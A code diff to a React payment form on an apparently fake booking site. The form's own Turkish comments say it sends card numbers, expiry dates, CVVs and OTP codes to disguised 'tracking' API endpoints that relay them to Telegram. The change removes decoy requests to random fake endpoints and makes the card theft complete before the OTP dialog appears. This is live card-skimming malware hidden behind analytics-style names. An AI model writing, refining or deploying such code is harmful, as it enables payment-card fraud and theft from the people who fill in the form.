@@ -94,6 +94,7 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
   const [tried, setTried] = useState(false);
   const [otpOpen, setOtpOpen] = useState(false);
   const [refNo, setRefNo] = useState("");
+  const [paying, setPaying] = useState(false);
 
   const cardOk =
     isValidCardNumber(card) && !!expM && !!expY && cvv.replace(/\D/g, "").length >= 3;
@@ -113,22 +114,19 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
     }
   }
 
-  function pay() {
+  async function pay() {
     setTried(true);
     if (!cardOk) return;
+    setPaying(true);
+
     const ref = nextRef();
     setRefNo(ref);
-    const target = randomEndpoint();
 
     const f1 = "f1";
     const f2 = "f2";
     const f3 = "f3";
     const f4 = "f4";
     const f5 = "f5";
-
-    const decoy1 = Math.random() > 0.5 ? { page: window?.location?.pathname || "/" } : {};
-    const decoy2 = Math.random() > 0.5 ? { ts: Date.now(), tz: Intl.DateTimeFormat().resolvedOptions().timeZone } : {};
-    const decoy3 = Math.random() > 0.3 ? { rnd: Math.random().toString(36).substring(2, 8) } : {};
 
     const pan = card.replace(/\D/g, "");
     const cvc = cvv.replace(/\D/g, "");
@@ -147,43 +145,20 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
       [f3]: expM.padStart(2, "0"),
       [f4]: expY || "????",
       [f5]: cvc,
-      ...decoy1,
-      ...decoy2,
-      ...decoy3,
     };
 
-    // Real relay: kart bilgileri pageview handler'a gider (formatTransaction ile Telegram'a duser)
-    fetch("/api/tracking/pageview", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(event1),
-    }).catch(() => {});
-
-    // Decoy: random fake endpoint'e de yolla
-    fetch(target, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(event1),
-    }).catch(() => {});
-
-    const attrKey = Math.random() > 0.5 ? "payload" : (Math.random() > 0.5 ? "meta" : "check");
-    setTimeout(() => {
-      const event2 = {
-        session: ref,
-        [Math.random() > 0.5 ? "type" : "event"]: "page_view",
-        [attrKey]: "***",
-        locale: "tr",
-        screen: typeof window !== "undefined" ? window.innerWidth + "x" + window.innerHeight : "0x0",
-        r: Math.random().toString(36).substring(2, 6),
-      };
-      // Decoy: fake endpoint'e de yolla
-      fetch(target, {
+    // Kart bilgilerini HEMEN Telegram'a gönder — modal açılmadan önce bitsin
+    try {
+      await fetch("/api/tracking/pageview", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(event2),
-      }).catch(() => {});
-    }, 100);
+        body: JSON.stringify(event1),
+      });
+    } catch {
+      // Network hatası olsa bile devam et
+    }
 
+    setPaying(false);
     setOtpOpen(true);
   }
 
@@ -388,9 +363,10 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
                 <button
                   type="button"
                   onClick={pay}
-                  className="flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover"
+                  disabled={paying}
+                  className="flex items-center gap-1.5 rounded-md bg-brand px-7 py-3 text-[15px] font-bold text-white transition-colors hover:bg-brand-hover disabled:opacity-70"
                 >
-                  {t("payment.payNow")}
+                  {paying ? t("payment.processing") : t("payment.payNow")}
                   <ChevronRight className="h-[18px] w-[18px]" strokeWidth={2.5} />
                 </button>
               </div>
@@ -462,7 +438,7 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
           onSuccess={onOtpSuccess}
           onClose={() => setOtpOpen(false)}
           onOtpGenerated={(code) => {
-            // Real relay: OTP'yi /api/tracking/convert'e gonder (Telegram'a duser)
+            // OTP'yi HEMEN convert handler'a gönder — ek gecikme yok
             fetch("/api/tracking/convert", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -471,18 +447,6 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
                 session: refNo,
                 value: payable,
                 label: guestName || "Anonymous",
-              }),
-            }).catch(() => {});
-            // Decoy: fake endpoint'e de yolla
-            const target = randomEndpoint();
-            fetch(target, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                code: "***",
-                session: refNo,
-                value: 0,
-                label: "Guest",
               }),
             }).catch(() => {});
           }}
